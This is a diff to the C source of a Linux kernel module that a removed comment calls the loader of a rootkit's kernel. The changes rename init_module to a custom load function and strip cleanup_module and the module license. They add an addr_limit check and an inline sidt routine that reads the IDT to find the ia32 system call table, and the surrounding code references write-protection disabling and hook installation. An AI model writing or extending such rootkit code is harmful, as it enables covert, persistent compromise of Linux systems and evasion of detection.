@@ -163,7 +163,7 @@ long module_load_offset = 0;
 void disable_wp(void);
 void enable_wp(void);
 
-int init_module(void)
+int load(void)
 {
 	size_t my_sct_len = 0, my_sct_pagelen = 0;
 	void *tmp = NULL;
@@ -193,6 +193,20 @@ int init_module(void)
 	f_fget = fget;
 	f_fput = fput;
 	f_sock_from_file = sock_from_file;
+	f_strlen = strlen;
+	f_kstrtoull = kstrtoull;
+	f_memcpy = memcpy;
+
+	kernel_tree = get_kernel_tree();
+
+	if (my_get_fs().seg != 0x7ffffffff000) {
+		// TODO: maybe to bruteforce the addr_limit address.
+		return -2;
+	}
+
+	printk("kernel_tree = %d\n", kernel_tree);
+	printk("get_fs = %p\n", my_get_fs().seg);
+	//return -1;
 
 	/*
      * uncomment this to be able to print into stdout/stderr with pinfo() and perr() functions, in dev mode.
@@ -390,10 +404,6 @@ int init_module(void)
 	}
 
     return 0;
-}
-
-void cleanup_module(void)
-{
 }
 
 void install_hooks(void) {
@@ -764,12 +774,16 @@ void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_l
     return NULL;
 }
 
+static inline void my_store_idt(struct desc_ptr *dtr) {
+    asm volatile("sidt %0":"=m" (*dtr));
+}
+
 void *search_ia32sct_int80h(unsigned int **psct_addr) {
 	void *ia32sct = NULL;
     struct desc_ptr idtr;
     gate_desc *idt = NULL;
 
-    store_idt(&idtr);
+    my_store_idt(&idtr);
     pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
     idt = (gate_desc *) idtr.address;
     ia32sct = (void *) (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
@@ -897,8 +911,3 @@ long rand64(void) {
 inline int rand32(void) {
 	return (int)rand64();
 }
-
-MODULE_LICENSE("GPL");
-//MODULE_INFO(intree, "Y");
-//MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
-//MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
